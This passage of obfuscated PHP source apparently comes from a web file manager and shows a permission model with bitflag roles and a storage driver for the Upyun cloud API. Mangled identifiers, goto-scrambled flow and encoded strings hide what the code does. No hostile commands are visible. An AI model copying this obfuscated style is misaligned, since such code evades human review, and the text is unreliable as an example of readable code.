$A‡¢ø‘˜ö[1586] => (int) $E»ĞÄ®ÒÙô, $A‡¢ø‘˜ö[1587] => (int) $fì™à§¬); goto Dç„áÓåÈ; aóâÒ¸†¶: $eµ³äˆŠ = $this->sourceSize(); $cªŠÂ¶¿Š = array($A‡¢ø‘˜ö[472] => 0, $A‡¢ø‘˜ö[398] => 1); $E»ĞÄ®ÒÙô = Model($A‡¢ø‘˜ö[760])->where($cªŠÂ¶¿Š)->sum($A‡¢ø‘˜ö[77]); goto bãÖ‚¿ÓĞ„; Dç„áÓåÈ: } private function sourceSize() { $cèñØè¨Ê =& $_SERVER[ç]; $d¸ÇÕæØ = Model($cèñØè¨Ê[760])->where(array($cèñØè¨Ê[397] => 0))->sum($cèñØè¨Ê[77]); $F£ïÈò„Î = Model($cèñØè¨Ê[444])->sum($cèñØè¨Ê[77]); if ($F£ïÈò„Î > $d¸ÇÕæØ) { $F£ïÈò„Î = $d¸ÇÕæØ; } return array($cèñØè¨Ê[77] => (int) $d¸ÇÕæØ, $cèñØè¨Ê[1585] => (int) $F£ïÈò„Î); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $CÃ÷¢›ùË =& $_SERVER[ç]; $fÉÙ»—ãŒ‰ = array(array($CÃ÷¢›ùË[407] => LNG($CÃ÷¢›ùË[1655]), $CÃ÷¢›ùË[1656] => $CÃ÷¢›ùË[1657], $CÃ÷¢›ùË[1658] => 1, $CÃ÷¢›ùË[1659] => 1, $CÃ÷¢›ùË[1660] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($CÃ÷¢›ùË[407] => LNG($CÃ÷¢›ùË[1661]), $CÃ÷¢›ùË[1656] => $CÃ÷¢›ùË[1662], $CÃ÷¢›ùË[1658] => 2, $CÃ÷¢›ùË[1659] => 1, $CÃ÷¢›ùË[1660] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($CÃ÷¢›ùË[407] => LNG($CÃ÷¢›ùË[1663]), $CÃ÷¢›ùË[1656] => $CÃ÷¢›ùË[1664], $CÃ÷¢›ùË[1658] => 3, $CÃ÷¢›ùË[1659] => 1, $CÃ÷¢›ùË[1660] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($CÃ÷¢›ùË[407] => LNG($CÃ÷¢›ùË[1665]), $CÃ÷¢›ùË[1656] => $CÃ÷¢›ùË[1666], $CÃ÷¢›ùË[1658] => 4, $CÃ÷¢›ùË[1659] => 1, $CÃ÷¢›ùË[1660] => self::AUTH_SHOW | self::AUTH_VIEW), array($CÃ÷¢›ùË[407] => LNG($CÃ÷¢›ùË[1667]), $CÃ÷¢›ùË[1656] => $CÃ÷¢›ùË[1668], $CÃ÷¢›ùË[1658] => 5, $CÃ÷¢›ùË[1659] => 1, $CÃ÷¢›ùË[1660] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($CÃ÷¢›ùË[407] => LNG($CÃ÷¢›ùË[1669]), $CÃ÷¢›ùË[1656] => $CÃ÷¢›ùË[1670], $CÃ÷¢›ùË[1658] => 6, $CÃ÷¢›ùË[1659] => 1, $CÃ÷¢›ùË[1660] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($CÃ÷¢›ùË[407] => LNG($CÃ÷¢›ùË[1671]), $CÃ÷¢›ùË[1656] => $CÃ÷¢›ùË[1672], $CÃ÷¢›ùË[1658] => 7, $CÃ÷¢›ùË[1659] => 1, $CÃ÷¢›ùË[1660] => 0)); return $fÉÙ»—ãŒ‰; } public static function authCheck($B÷ÜÈÔóŸ, $DñŒ­”ŠÄ) { $B÷ÜÈÔóŸ = intval($B÷ÜÈÔóŸ); if ($GLOBALS[$_SERVER[ç][479]]) { return !0; } if ($B÷ÜÈÔóŸ <= 0) { return !1; } if (($B÷ÜÈÔóŸ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($B÷ÜÈÔóŸ & $DñŒ­”ŠÄ); } public static function authCheckShow($d†êÂ±‚‡¤) { return self::authCheck($d†êÂ±‚‡¤, self::AUTH_SHOW); } public static function authCheckView($DŒ£‚¾ä™¾) { return self::authCheck($DŒ£‚¾ä™¾, self::AUTH_VIEW); } public static function authCheckDownload($Bîí£Ò­ß) { return self::authCheck($Bîí£Ò­ß, self::AUTH_DOWNLOAD); } public static function authCheckUpload($C…³´òìˆ) { return self::authCheck($C…³´òìˆ, self::AUTH_UPLOAD); } public static function authCheckEdit($F‚ŒòÇî‹™) { return self::authCheck($F‚ŒòÇî‹™, self::AUTH_EDIT); } public static function authCheckRemove($Fù„©Úñªä) { return self::authCheck($Fù„©Úñªä, self::AUTH_REMOVE); } public static function authCheckShare($a–Â–“ßë¨) { return self::authCheck($a–Â–“ßë¨, self::AUTH_SHARE); } public static function authCheckComment($Cö¦”òš¤) { return self::authCheck($Cö¦”òš¤, self::AUTH_COMMENT); } public static function authCheckEvent($e‚ˆÖ®¨–‚) { return self::authCheck($e‚ˆÖ®¨–‚, self::AUTH_EVENT); } public static function authCheckRoot($bÃ¬ØùÆŒæ) { return self::authCheck($bÃ¬ØùÆŒæ, self::AUTH_ROOT); } public static function authCheckAction($EëÑ¿î¾çˆ, $bçÈå˜®°³) { goto FÁ’ÚÇ³„Ô; FåŠÍ½‰›é: $BçÏÂá¢“ = $Bâô¿îË¦¤[$bçÈå˜®°³]; $EëÑ¿î¾çˆ = intval($EëÑ¿î¾çˆ); if ($EëÑ¿î¾çˆ <= 0) { return !1; } goto f›ƒ¨•Ê¼Œ; f›ƒ¨•Ê¼Œ: if (($EëÑ¿î¾çˆ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($EëÑ¿î¾çˆ & $BçÏÂá¢“); goto eˆ’óíÆÛÒ; FÁ’ÚÇ³„Ô: $Bßõäö­½ =& $_SERVER[ç]; $Bâô¿îË¦¤ = array($Bßõäö­½[1673] => self::AUTH_VIEW, $Bßõäö­½[1061] => self::AUTH_DOWNLOAD, $Bßõäö­½[106] => self::AUTH_UPLOAD, $Bßõäö­½[1621] => self::AUTH_EDIT, $Bßõäö­½[1620] => self::AUTH_REMOVE, $Bßõäö­½[1631] => self::AUTH_SHARE, $Bßõäö­½[350] => self::AUTH_COMMENT, $Bßõäö­½[1480] => self::AUTH_EVENT, $Bßõäö­½[1674] => self::AUTH_ROOT); if (!isset($Bâô¿îË¦¤[$bçÈå˜®°³])) { return; } goto FåŠÍ½‰›é; eˆ’óíÆÛÒ: } public static function authDisable($CÁë¦Šˆ°Ü, $D§Œ†•ŞË¦) { if (intval($CÁë¦Šˆ°Ü) <= 0) { return 0; } return intval($CÁë¦Šˆ°Ü) & ~$D§Œ†•ŞË¦; } public $optionType = "\x53\x79\163\x74\145\x6d\x2e\163\157\165\162\143\x65\101\165\x74\x68\114\151\x73\x74"; public $field = array("\156\141\155\145", "\x61\x75\x74\x68", "\x6c\141\142\145\154", "\x64\151\x73\x70\x6c\x61\x79", "\x73\171\163\x74\x65\x6d", "\163\x6f\162\164"); public function initData() { $F‡‰Ş÷‘Ş = $this->authDefault(); foreach ($F‡‰Ş÷‘Ş as $b××©‰·ÖŸ) { $this->add($b××©‰·ÖŸ); } } public function listData($cØí‡Ÿ¨äÀ = false, $f¾Ã•ÍÂÙ¸ = "\x73\x6f\x72\164", $dçíÂ‘¿¿§ = false) { return parent::listData($cØí‡Ÿ¨äÀ, $f¾Ã•ÍÂÙ¸, $dçíÂ‘¿¿§); } public function update($a™ğæ£‡äœ, $cĞš¶Ø·Ô) { $d˜×¼¥¯£ =& $_SERVER[ç]; $fÈ÷‡öğ« = parent::listData($a™ğæ£‡äœ); $E†àÄ¢ˆ„… = $this->findByName($cĞš¶Ø·Ô[$d˜×¼¥¯£[28]]); if (!$fÈ÷‡öğ« || $E†àÄ¢ˆ„… && $E†àÄ¢ˆ„…[$d˜×¼¥¯£[388]] != $fÈ÷‡öğ«[$d˜×¼¥¯£[388]]) { return !1; } $this->filterAuth($cĞš¶Ø·Ô[$d˜×¼¥¯£[400]]); return parent::update($a™ğæ£‡äœ, $cĞš¶Ø·Ô); } public function remove($A†¡Ÿ„„…Ÿ) { $b±†àÛô²Ó = parent::listData($A†¡Ÿ„„…Ÿ); if (!$b±†àÛô²Ó || $b±†àÛô²Ó[$_SERVER[ç][1136]]) { return !1; } return parent::remove($A†¡Ÿ„„…Ÿ); } public function add($a¢÷–”§àÕ = array()) { goto FŸŒùæğé; DÅ™¿¼å¢: return parent::insert($a¢÷–”§àÕ); goto Cƒğ’‚ÍâÏ; b™Æœø…©Ï: $a¢÷–”§àÕ = array_merge($D ùÚƒ­äÏ, $a¢÷–”§àÕ); $a¢÷–”§àÕ[$Eã„À…İ¨¹[1677]] = $this->getSort(); $this->filterAuth($a¢÷–”§àÕ[$Eã„À…İ¨¹[400]]); goto DÅ™¿¼å¢; FŸŒùæğé: $Eã„À…İ¨¹ =& $_SERVER[ç]; if ($this->findByName($a¢÷–”§àÕ[$Eã„À…İ¨¹[28]])) { return !1; } $D ùÚƒ­äÏ = array($Eã„À…İ¨¹[28] => $Eã„À…İ¨¹[33], $Eã„À…İ¨¹[400] => 1, $Eã„À…İ¨¹[1675] => $Eã„À…İ¨¹[1664], $Eã„À…İ¨¹[1676] => 1, $Eã„À…İ¨¹[1136] => 0, $Eã„À…İ¨¹[1677] => 0); goto b™Æœø…©Ï; Cƒğ’‚ÍâÏ: } private function getSort() { $D‰Ç¤™½³ =& $_SERVER[ç]; $c·ë¨ãœÖª = parent::listData(); $A°‘­ÏË²Ë = array_to_keyvalue($c·ë¨ãœÖª, $D‰Ç¤™½³[33], $D‰Ç¤™½³[1677]); return empty($A°‘­ÏË²Ë) ? 0 : max($A°‘­ÏË²Ë) + 1; } private function filterAuth(&$E†§Æ†÷æ“) { goto F¶™³è©„; F¶™³è©„: if (!$E†§Æ†÷æ“) { return; } $dğ™ŠêˆĞ¼ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $E÷¼Ëƒ÷óÏ = array(); goto E×ÚÁ›Áº; E×ÚÁ›Áº: foreach ($dğ™ŠêˆĞ¼ as $C«’÷Êˆ¼ò) { if ($E†§Æ†÷æ“ & $C«’÷Êˆ¼ò) { $E÷¼Ëƒ÷óÏ[] = $C«’÷Êˆ¼ò; } } if (in_array(self::AUTH_ROOT, $E÷¼Ëƒ÷óÏ)) { $E†§Æ†÷æ“ = array_sum($dğ™ŠêˆĞ¼); return; } $FÆ¾ƒÙÈ¶“ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto bÁğÚâõÃ; bÁğÚâõÃ: foreach ($E÷¼Ëƒ÷óÏ as $C«’÷Êˆ¼ò) { if (isset($FÆ¾ƒÙÈ¶“[$C«’÷Êˆ¼ò])) { $E÷¼Ëƒ÷óÏ = array_merge($E÷¼Ëƒ÷óÏ, $FÆ¾ƒÙÈ¶“[$C«’÷Êˆ¼ò]); } } $E÷¼Ëƒ÷óÏ[] = self::AUTH_SHOW; $E†§Æ†÷æ“ = array_sum(array_unique($E÷¼Ëƒ÷óÏ)); goto D„Æªâ†ì´; D„Æªâ†ì´: } public function sort($A×‡»¦ò¸Ó, $eœ¸ÈĞßğÓ) { return parent::update($A×‡»¦ò¸Ó, $eœ¸ÈĞßğÓ); } } goto b˜ªİ¾‹Ù; Bëñ¿ÛÙ—ª: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\164\164\x70\x3a\57\57\x76\x30\x2e\x61\160\x69\56\x75\x70\171\x75\x6e\x2e\x63\x6f\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($cÚ»¤Ï‰å) { parent::__construct(); $this->_init($cÚ»¤Ï‰å); } public function _init($fŸÁî¸­©) { $eÜö†÷º‚Ü =& $_SERVER[ç]; foreach ($fŸÁî¸­© as $eÂãèƒñˆÊ => $CØ¸£†) { if (isset($this->{$eÂãèƒñˆÊ})) { $this->{$eÂãèƒñˆÊ} = $CØ¸£†; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($eÜö†÷º‚Ü[1294] . LNG($eÜö†÷º‚Ü[1226])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($cŒÓŠÖÈƒµ, $A¾Ú§²Š´å = "\107\105\124") { $F¯Üô„œŸ™ =& $_SERVER[ç]; $c‚çëÒİ´· = gmdate($F¯Üô„œŸ™[1260]); $cî†±—”Ü = base64_encode(hash_hmac($F¯Üô„œŸ™[1295], "{$A¾Ú§²Š´å}\46{$cŒÓŠÖÈƒµ}\x26{$c‚çëÒİ´·}", md5("{$this->userpass}"), !0)); $f–éİƒ°Œ = array("\101\x75\x74\150\x6f\x72\151\172\141\164\151\157\156\72\125\120\x59\x55\116\x20{$this->username}\x3a{$cî†±—”Ü}", "\x44\141\x74\x65\72{$c‚çëÒİ´·}"); return $f–éİƒ°Œ; } public function ussRequest($CœÊÚäÜ×½, $bŞ Àğï‡ = "\x47\x45\x54", $DØÈÍç±ƒ½ = false, $Bè‘İ¾›ÆÛ = false, $C©†õÁÕÍª = false) { goto CÙÔ¦Îæè ; CÙÔ¦Îæè : $A¼±¶³²õ =& $_SERVER[ç]; $CœÊÚäÜ×½ = trim($CœÊÚäÜ×½, $A¼±¶³²õ[8]); $c¬¥Ó®ëçé = "\x2f{$this->bucket}\x2f{$CœÊÚäÜ×½}"; goto b ²“ĞÈ; A¢¹“™äì: if (!$Eö»„–ŒÄô) { return array($A¼±¶³²õ[1053] => !1, $A¼±¶³²õ[1055] => $A¼±¶³²õ[1296]); } if (strtolower($bŞ Àğï‡) == $A¼±¶³²õ[190] || in_array($Eö»„–ŒÄô[$A¼±¶³²õ[1053]], array($A¼±¶³²õ[1154], $A¼±¶³²õ[1297]))) { $DØÈÍç±ƒ½ = $Eö»„–ŒÄô[$A¼±¶³²õ[1298]]; } else { $DØÈÍç±ƒ½ = json_decode($Eö»„–ŒÄô[$A¼±¶³²õ[1055]], !0); if (!$DØÈÍç±ƒ½) { $DØÈÍç±ƒ½ = $Eö»„–ŒÄô[$A¼±¶³²õ[1055]]; } else { if (!$Eö»„–ŒÄô[$A¼±¶³²õ[695]] && isset($DØÈÍç±ƒ½[$A¼±¶³²õ[1299]])) { $DØÈÍç±ƒ½ = $DØÈÍç±ƒ½[$A¼±¶³²õ[1299]]; } } } return array($A¼±¶³²õ[1053] => $Eö»„–ŒÄô[$A¼±¶³²õ[695]], $A¼±¶³²õ[1055] => $DØÈÍç±ƒ½); goto BÆµ›ò§Òñ; b ²“ĞÈ: $eé™¸ğ“å = $this->ussHeaders($c¬¥Ó®ëçé, $bŞ Àğï‡); if ($Bè‘İ¾›ÆÛ) { $eé™¸ğ“å = array_merge($eé™¸ğ“å, $Bè‘İ¾›ÆÛ); } $Eö»„–ŒÄô = url_request($this->endpoint . $c¬¥Ó®ëçé, $bŞ Àğï‡, $DØÈÍç±ƒ½, $eé™¸ğ“å, $C©†õÁÕÍª); goto A¢¹“™äì; BÆµ›ò§Òñ: } public function mkfile($AÕÜø¢ë´, $BîÔ•¸‰ââ = '', $còŞõğÔ÷ä = REPEAT_RENAME) { if ($this->setContent($AÕÜø¢ë´, $BîÔ•¸‰ââ)) { return $this->getPathOuter($AÕÜø¢ë´); } return !1; } public function mkdir($fº†›ˆÛæ·, $cèÖĞÖë¶† = REPEAT_SKIP) { $Aª„Ç—ÂÈË =& $_SERVER[ç]; $Bî»ø·‚÷é = trim($fº†›ˆÛæ·, $Aª„Ç—ÂÈË[8]); if ($this->_isFolder($Bî»ø·‚÷é)) { return $this->getPathOuter($Bî»ø·‚÷é); } $DõÒ–É¯Ê‡ = array($Aª„Ç—ÂÈË[1300]); $e¦¥Ò¢Éİ = $this->ussRequest($Bî»ø·‚÷é, $Aª„Ç—ÂÈË[222], !1, $DõÒ–É¯Ê‡); return $e¦¥Ò¢Éİ[$Aª„Ç—ÂÈË[1053]] ? $this->getPathOuter($Bî»ø·‚÷é) : !1; } public function copyFile($e Ë¿Ã¾’Î, $BÍ±½Ò‚) { $E¹„ŒÎî¬’ =& $_SERVER[ç]; $f¨ê˜‰ä–¤ = array($E¹„ŒÎî¬’[1301] . "\x2f{$this->bucket}\57{$e Ë¿Ã¾’Î}", $E¹„ŒÎî¬’[1302]); $Dë§¦ÕÚñš = $this->ussRequest($BÍ±½Ò‚, $E¹„ŒÎî¬’[224], !1, $f¨ê˜‰ä–¤); return $Dë§¦ÕÚñš[$E¹„ŒÎî¬’[1053]] ? !0 : $this->getPathOuter($BÍ±½Ò‚); } public function moveFile($C’…Ù–Û„„, $b³›¥†Ÿ®™) { $eÍÒÖÒº×† =& $_SERVER[ç]; $Eµ’ì­ªµ = array($eÍÒÖÒº×†[1303] . "\57{$this->bucket}\x2f{$C’…Ù–Û„„}", $eÍÒÖÒº×†[1302]); $b”ÉÆ¯ŞÁ¤ = $this->ussRequest($b³›¥†Ÿ®™, $eÍÒÖÒº×†[224], !1, $Eµ’ì­ªµ); return $b”ÉÆ¯ŞÁ¤[$eÍÒÖÒº×†[1053]] ? !0 : $this->getPathOuter($b³›¥†Ÿ®™); } public function delFile($a¤…ù‹´²´) { $aéÀùæ™êİ =& $_SERVER[ç]; $a®†Ÿ¡İÉ = $this->ussRequest($a¤…ù‹´²´, $aéÀùæ™êİ[1304]); return $a®†Ÿ¡İÉ[$aéÀùæ™êİ[1053]] ? !0 : !1; } public function delFolder($cÇôïİƒÉ…) { goto AÕ™Öâ¥’Ş; AÕ™Öâ¥’Ş: $A®—á¡¢‘ª =& $_SERVER[ç]; if (!$this->exist($cÇôïİƒÉ…)) { return !0; } $this->listItemCache = !1; goto eò›öÌÇ“Å; D­î«ÈÃ‰Ù: return $C·‚Ç¨ˆ’[$A®—á¡¢‘ª[1053]]; goto eöÎàŸˆ¼Ï; F”æŒ‘«ÄÇ: foreach ($D£†Å¿÷ñ as $b¼³š´µ’ù) { $C·‚Ç¨ˆ’ = $this->ussRequest($b¼³š´µ’ù[$A®—á¡¢‘ª[28]], $A®—á¡¢‘ª[1304]); if (!$C·‚Ç¨ˆ’[$A®—á¡¢‘ª[1053]]) { return !1; } } foreach ($B™‹²ÄĞÉ© as $CéÖÙóÊÚØ) { $C·‚Ç¨ˆ’ = $this->ussRequest($CéÖÙóÊÚØ, $A®—á¡¢‘ª[1304]); if (!$C·‚Ç¨ˆ’[$A®—á¡¢‘ª[1053]]) { return !1; } } $C·‚Ç¨ˆ’ = $this->ussRequest($cÇôïİƒÉ…, $A®—á¡¢‘ª[1304]); goto D­î«ÈÃ‰Ù; eò›öÌÇ“Å: $B™‹²ÄĞÉ© = $D£†Å¿÷ñ = array(); $this->fileList($cÇôïİƒÉ…, $B™‹²ÄĞÉ©, $D£†Å¿÷ñ, !0); $this->listItemCache = !0; goto F”æŒ‘«ÄÇ; eöÎàŸˆ¼Ï: } public function rename($eƒí…“çÍ¦, $fñŸ“‚£ÚÃ) { if ($this->isFile($eƒí…“çÍ¦)) { $fñŸ“‚£ÚÃ = get_path_father($eƒí…“çÍ¦) . $fñŸ“‚£ÚÃ; return $this->moveFile($eƒí…“çÍ¦, $fñŸ“‚£ÚÃ); } return $this->renameObject($eƒí…“çÍ¦, $fñŸ“‚£ÚÃ); } public function fileInfo($C¼Ó£¾è±ö, $C¶Ì“ç“Œë = false, $fœğ„‰íë = array()) { goto Cõ†¬èÑé; Cõ†¬èÑé: $DÈéãâÔ° =& $_SERVER[ç]; $DçİÅœ…¬ = array($DÈéãâÔ°[28] => $this->pathThis($C¼Ó£¾è±ö), $DÈéãâÔ°[75] => $this->getPathOuter($DÈéãâÔ°[8] . $C¼Ó£¾è±ö), $DÈéãâÔ°[29] => $DÈéãâÔ°[173], $DÈéãâÔ°[77] => isset($fœğ„‰íë[$DÈéãâÔ°[77]]) ? $fœğ„‰íë[$DÈéãâÔ°[77]] : 0, $DÈéãâÔ°[167] => $this->ext($C¼Ó£¾è±ö)); if ($C¶Ì“ç“Œë) { return $DçİÅœ…¬; } goto f§µ±Äº‹; Bã¥¯Ã¡ƒá: return $DçİÅœ…¬; goto eİåòÉ‡¸®; c£ ä…·¤ˆ: $DçİÅœ…¬[$DÈéãâÔ°[192]] = intval($fœğ„‰íë[$DÈéãâÔ°[1305]]); $DçİÅœ…¬[$DÈéãâÔ°[83]] = intval($fœğ„‰íë[$DÈéãâÔ°[1306]]); $DçİÅœ…¬[$DÈéãâÔ°[77]] = $fœğ„‰íë[$DÈéãâÔ°[77]]; goto Bã¥¯Ã¡ƒá; f§µ±Äº‹: $DçİÅœ…¬[$DÈéãâÔ°[192]] = $DçİÅœ…¬[$DÈéãâÔ°[83]] = 0; $DçİÅœ…¬[$DÈéãâÔ°[193]] = $DçİÅœ…¬[$DÈéãâÔ°[194]] = !0; if (empty($fœğ„‰íë)) { $fœğ„‰íë = $this->objectMeta($C¼Ó£¾è±ö); if (!$fœğ„‰íë) { return $DçİÅœ…¬; } } goto c£ ä…·¤ˆ; eİåòÉ‡¸®: } public function folderInfo($Cì·Ú£¡èé, $DŠ©¬Ñ¤Ş = false) { goto Då£Ì‘†; DÀš»šœÙŒ: $f‡ºŸÇãä•[$E‡ç¶´‹‰[192]] = intval($D¹¤„‚÷‚â[$E‡ç¶´‹‰[1305]]); $f‡ºŸÇãä•[$E‡ç¶´‹‰[83]] = intval($D¹¤„‚÷‚â[$E‡ç¶´‹‰[1306]]); return $f‡ºŸÇãä•; goto BêÁŒÒŒÉñ; Då£Ì‘†: $E‡ç¶´‹‰ =& $_SERVER[ç]; $f‡ºŸÇãä• = array($E‡ç¶´‹‰[28] => $this->pathThis($Cì·Ú£¡èé), $E‡ç¶´‹‰[75] => $this->getPathOuter($E‡ç¶´‹‰[8] . $Cì·Ú£¡èé), $E‡ç¶´‹‰[29] => $E‡ç¶´‹‰[76]); if ($DŠ©¬Ñ¤Ş) { return $f‡ºŸÇãä•; } goto e…×’­ÔŸ; e…×’­ÔŸ: $f‡ºŸÇãä•[$E‡ç¶´‹‰[192]] = $f‡ºŸÇãä•[$E‡ç¶´‹‰[83]] = 0; $f‡ºŸÇãä•[$E‡ç¶´‹‰[193]] = $f‡ºŸÇãä•[$E‡ç¶´‹‰[194]] = !0; if (empty($D¹¤„‚÷‚â)) { $D¹¤„‚÷‚â = $this->objectMeta($Cì·Ú£¡èé); if (!$D¹¤„‚÷‚â) { return $f‡ºŸÇãä•; } } goto DÀš»šœÙŒ; BêÁŒÒŒÉñ: } private function listObjs($CÈâË™õï, $F–ÕÛ«åÖ¢ = 0, $F‹ªĞÅ¶Õ = 1000) { $B­—‹†Ï¸ =& $_SERVER[ç]; $fÚœˆÁíˆî = array($B­—‹†Ï¸[1307], $B­—‹†Ï¸[1308] . $F‹ªĞÅ¶Õ); if ($F–ÕÛ«åÖ¢) { $fÚœˆÁíˆî[] = $B­—‹†Ï¸[1309] . $F–ÕÛ«åÖ¢; } $eãÖ§ã…– = $this->ussRequest($CÈâË™õï, $B­—‹†Ï¸[226], !1, $fÚœˆÁíˆî); return !$eãÖ§ã…–[$B­—‹†Ï¸[1053]] ? !1 : $eãÖ§ã…–[$B­—‹†Ï¸[1055]]; } private function fileList($dãæ² ò©Î, &$F•¼—Î©ìè, &$cšŒœ­±ôØ, $A‡‚ãÅ‚ğº = false) { goto fã²‡ï¬½¶; Eß™ëÅá§Ÿ: $Dî×øâÓ„º = rtrim($dãæ² ò©Î, $C»ŸµñÒç‡[8]) . $C»ŸµñÒç‡[8]; $eíÓÂôÓŠ‡ = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $c±ëªùÉ÷Æ = $this->listObjs($dãæ² ò©Î, $CØª›É…Ú¸, $E“ÃùÒĞ‘À); if (!$c±ëªùÉ÷Æ) { return !1; } $CØª›É…Ú¸ = isset($c±ëªùÉ÷Æ[$C»ŸµñÒç‡[1310]]) ? $c±ëªùÉ÷Æ[$C»ŸµñÒç‡[1310]] : $C»ŸµñÒç‡[33]; $EÆ‚Î¥‚”ù = isset($c±ëªùÉ÷Æ[$C»ŸµñÒç‡[1311]]) ? $c±ëªùÉ÷Æ[$C»ŸµñÒç‡[1311]] : array(); foreach ($EÆ‚Î¥‚”ù as $d÷–È¥Çòº) { $bº…”¼ÊÊà = $d÷–È¥Çòº[$C»ŸµñÒç‡[29]] == $C»ŸµñÒç‡[76] ? !0 : !1; $Bê’·ïŞøØ = ltrim($Dî×øâÓ„º . $d÷–È¥Çòº[$C»ŸµñÒç‡[28]], $C»ŸµñÒç‡[8]) . ($bº…”¼ÊÊà ? $C»ŸµñÒç‡[8] : $C»ŸµñÒç‡[33]); $CÙù éŠ = array($C»ŸµñÒç‡[28] => $Bê’·ïŞøØ, $C»ŸµñÒç‡[29] => $bº…”¼ÊÊà ? $C»ŸµñÒç‡[76] : $C»ŸµñÒç‡[173], $C»ŸµñÒç‡[77] => $d÷–È¥Çòº[$C»ŸµñÒç‡[333]], $C»ŸµñÒç‡[1306] => $d÷–È¥Çòº[$C»ŸµñÒç‡[1312]]); if ($eíÓÂôÓŠ‡) { $this->cacheMethod($C»ŸµñÒç‡[197], $Bê’·ïŞøØ, $bº…”¼ÊÊà); $this->cacheMethod($C»ŸµñÒç‡[198], $Bê’·ïŞøØ, $CÙù éŠ); } if ($bº…”¼ÊÊà) { $F•¼—Î©ìè[] = $Bê’·ïŞøØ; if ($A‡‚ãÅ‚ğº) { $this->fileList($Bê’·ïŞøØ, $F•¼—Î©ìè, $cšŒœ­±ôØ, $A‡‚ãÅ‚ğº); } continue; } $cšŒœ­±ôØ[] = $CÙù éŠ; } if (count($EÆ‚Î¥‚”ù) < $E“ÃùÒĞ‘À) { break; } } goto CêÕÉ°ø¥Â; CêÕÉ°ø¥Â: if ($eíÓÂôÓŠ‡) { $this->cacheMethod($C»ŸµñÒç‡[197], $dãæ² ò©Î, !0); } goto e³ªØ‹óğÃ; fã²‡ï¬½¶: $C»ŸµñÒç‡ =& $_SERVER[ç]; $CØª›É…Ú¸ = $C»ŸµñÒç‡[33]; $E“ÃùÒĞ‘À = 1000; goto Eß™ëÅá§Ÿ; e³ªØ‹óğÃ: } public function listPath($E¬†³³…îä, $e™øï¹§×© = false) { $bèî­Ğ§§Â =& $_SERVER[ç]; $B°ä¿Ò–¬ª = $Dˆ˜Ûç¯­ğ = array(); $this->fileList($E¬†³³…îä, $B°ä¿Ò–¬ª, $Dˆ˜Ûç¯­ğ); foreach ($B°ä¿Ò–¬ª as $aè§„œ´Ñ => $d˜µ²Ğ»‰İ) { $B°ä¿Ò–¬ª[$aè§„œ´Ñ] = $this->folderInfo($d˜µ²Ğ»‰İ, $e™øï¹§×©); } foreach ($Dˆ˜Ûç¯­ğ as $aè§„œ´Ñ => $d˜µ²Ğ»‰İ) { $Dˆ˜Ûç¯­ğ[$aè§„œ´Ñ] = $this->fileInfo($d˜µ²Ğ»‰İ[$bèî­Ğ§§Â[28]], $e™øï¹§×©, $d˜µ²Ğ»‰İ); } return array($bèî­Ğ§§Â[74] => $B°ä¿Ò–¬ª, $bèî­Ğ§§Â[73] => $Dˆ˜Ûç¯­ğ); } public function has($E…‚èëŒ¯Š, $bÁÃÔ™÷®• = false, $B®ÏŠ©²‡‘ = true) { goto E…Ë•÷Ã§; dºñß±äÙ±: while (!0) { check_abort(); $eÜ†¬„Èºˆ = $this->listObjs($E…‚èëŒ¯Š, $fÄ×…òÔŒË, $fØ ÔÉ§Áª); if (!$eÜ†¬„Èºˆ) { return !1; } $fÄ×…òÔŒË = isset($eÜ†¬„Èºˆ[$fãÍƒ¯õĞŠ[1310]]) ? $eÜ†¬„Èºˆ[$fãÍƒ¯õĞŠ[1310]] : $fãÍƒ¯õĞŠ[33]; $BŸ„ãÙ¹×  = isset($eÜ†¬„Èºˆ[$fãÍƒ¯õĞŠ[1311]]) ? $eÜ†¬„Èºˆ[$fãÍƒ¯õĞŠ[1311]] : array(); if (empty($BŸ„ãÙ¹× )) { break; } $FÉ„ÚÖ®» = array_filter($BŸ„ãÙ¹× , function ($eÇ’Ôøİ±¼) { $d¯Ô¥˜¡­ =& $_SERVER[ç]; return 